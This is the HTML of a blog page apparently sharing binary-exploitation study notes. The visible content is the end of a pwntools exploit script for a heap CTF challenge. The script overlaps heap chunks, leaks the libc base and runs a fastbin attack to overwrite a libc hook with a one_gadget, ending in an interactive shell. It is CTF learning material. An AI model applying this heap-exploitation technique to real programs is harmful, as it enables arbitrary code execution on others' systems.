class="string">': \n'</span>)</span><br><span class="line">    data = p.recvline()</span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">': '</span>)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 0</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 1</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 2</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 3</span></span><br><span class="line">    alloc(<span class="number">0x80</span>) <span class="comment">#index 4</span></span><br><span class="line">    alloc(<span class="number">0x20</span>) <span class="comment">#index 5 Avoid merging into top_chunk</span></span><br><span class="line">    free(<span class="number">1</span>)</span><br><span class="line">    free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    payload += p8(<span class="number">0xc0</span>)</span><br><span class="line">    fill(<span class="number">0</span>, payload)</span><br><span class="line"></span><br><span class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x31</span>)</span><br><span class="line">    fill(<span class="number">3</span>, payload)</span><br><span class="line"></span><br><span class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#index 1</span></span><br><span class="line">    alloc(<span class="number">0x20</span>)<span class="comment">#index 2 0x80</span></span><br><span class="line"></span><br><span class="line">    payload  = p64(<span class="number">0</span>)*<span class="number">5</span></span><br><span class="line">    payload += p64(<span class="number">0x91</span>)</span><br><span class="line">    fill(<span class="number">3</span>, payload)<span class="comment">#recover 0x80</span></span><br><span class="line">    </span><br><span class="line">    free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">    libc_base = u64(dump(<span class="number">2</span>)[:<span class="number">8</span>]) - <span class="number">0x3c4b78</span></span><br><span class="line">    log.info(<span class="string">"libc_base: "</span> + hex(libc_base))<span class="comment">#libc successful</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)<span class="comment">#0x80----&gt;0x70</span></span><br><span class="line">    free(<span class="number">4</span>)	<span class="comment">#Set to fastbin</span></span><br><span class="line">    fill(<span class="number">2</span>, p64(libc_base + <span class="number">0x3c4aed</span>)) <span class="comment">#Fastbin attack target</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)<span class="comment">#index 4</span></span><br><span class="line">    alloc(<span class="number">0x60</span>)<span class="comment">#index 6</span></span><br><span class="line">    <span class="comment">#gdb.attach(p,'brva 0xdcc\nbrva 0x1022\nbrva 0x4f3\nbrva 0x1107')</span></span><br><span class="line">    payload  = <span class="string">'\x00'</span>*<span class="number">3</span></span><br><span class="line">    payload += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">    payload += p64(libc_base + <span class="number">0x4526a</span>)</span><br><span class="line">    fill(<span class="number">6</span>, payload)</span><br><span class="line">    </span><br><span class="line">    alloc(<span class="number">255</span>)</span><br><span class="line"></span><br><span class="line">exploit()</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

  </div>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let activeClass = CONFIG.comments.activeClass;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Coldshield"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">Coldshield</p>
  <div class="site-description" itemprop="description">分享一些bin学习日常的菜鸡</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">20</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">7</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Coldshield</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> v4.2.0
  </div>
  <span class="post-meta-divider">|</span>
  <div class="theme-info">Theme – <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.7.2
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="fa fa-eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  




  
<script src="/js/local-search.js"></script>













  

  


<script>
NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
  NexT.utils.getScript('https://cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js', () => {
    var GUEST = ['nick', 'mail', 'link'];
    var guest = 'nick,mail,link';
    guest = guest.split(',').filter(item => {
      return GUEST.includes(item);
    });
    new Valine({
      el         : '#valine-comments',
      verify     : true,
      notify     : false,
      appId      : 'APq34QYuAOTUtOPWMtySvyvt-gzGzoHsz',
      appKey     : 'xRjoMerK1OFN4Lad4pyXT0Bs',
      placeholder: "Just go go",
      avatar     : 'mm',
      meta       : guest,
      pageSize   : '10' || 10,
      visitor    : false,
      lang       : 'zh-cn' || 'zh-cn',
      path       : location.pathname,
      recordIP   : false,
      serverURLs : ''
    });
  }, window.Valine);
});
</script>

</body>
</html>
